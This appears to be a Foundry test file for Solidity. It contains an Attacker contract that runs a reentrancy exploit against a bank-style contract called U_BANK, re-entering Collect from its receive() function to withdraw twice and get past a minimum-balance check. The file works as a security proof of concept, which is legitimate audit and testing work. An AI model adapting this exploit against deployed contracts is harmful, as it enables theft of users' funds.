
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {U_BANK, Log} from "../src/U_BANK.sol";

contract TestReentrancyU_BANK is Test {
    U_BANK public _contractUnderTest;
    Log public _log;
    Attacker public _attacker;

    function setUp() public {
        _log = new Log();
        _contractUnderTest = new U_BANK(address(_log));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        // --- 1. Constraints & Pitfall Avoidance ---
        // We constrain attackVal to be <= 1 ether. 
        // The MinSum is 2 ether. We will deposit 2 ether.
        // We want to withdraw 'attackVal' twice. 
        // 2 * attackVal must be <= 2 ether (the deposit) to avoid underflow in 0.8.x logic.
        // This proves we can bypass the MinSum check (which requires balance >= 2 ether) on the second call.
        vm.assume(attackVal >= 0.1 ether && attackVal <= 1 ether);
        
        uint256 depositAmount = 2 ether;

        // --- 3. Funding ---
        vm.deal(address(_contractUnderTest), 0); 
        vm.deal(address(_attacker), depositAmount);
        vm.deal(address(this), depositAmount);

        // --- 4. Trigger Attack ---
        // Setup: Deposit the MinSum (2 ether)
        _attacker.setupAttack{value: depositAmount}(depositAmount);

        // The contract requires block.timestamp > unlockTime.
        // Put(0) sets unlockTime to block.timestamp.
        // We must warp forward to pass the check.
        vm.warp(block.timestamp + 100);

        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}

    fallback() external payable {}
}

contract Attacker {
    U_BANK public target;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public amountToWithdraw;

    constructor(address victimAddress) { 
        target = U_BANK(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        // Deposit funds to set up the account state
        target.Put{value: val}(0);
    }

    function attack(uint256 val) public {
        amountToWithdraw = val;
        attackCallCount = 0;
        exploitSucceeded = false;
        
        uint256 initialBalance = address(this).balance;

        // Call the vulnerable function
        target.Collect(val);

        // Verify Success Conditions
        // If we successfully withdrew twice, our balance should increase by val * 2
        if (address(this).balance >= initialBalance + (val * 2)) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        attackCallCount++;
        if (attackCallCount < 2) {            
            // Re-enter the contract
            // On the second call, the balance has not yet been updated, 
            // so the MinSum check (balance >= 2 ether) passes again.
            target.Collect(amountToWithdraw);
        }
    }

    fallback() external payable {}
}
